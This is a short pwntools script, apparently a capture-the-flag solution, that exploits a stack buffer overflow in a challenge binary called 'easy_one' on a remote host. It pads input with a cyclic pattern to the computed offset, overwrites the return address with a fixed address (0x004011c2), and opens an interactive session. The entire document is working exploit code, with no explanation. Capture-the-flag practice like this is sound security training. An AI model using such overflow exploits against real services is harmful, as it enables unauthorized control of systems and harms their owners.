from pwn import *

#p = process('./easy_one')
#input('debug')
p = remote('get-it.darkarmy.xyz', 7001)
payload = bytes(cyclic(cyclic_find('saaa')), 'utf-8')
payload += p64(0x004011c2)

p.recv()
p.sendline(payload)

p.interactive()

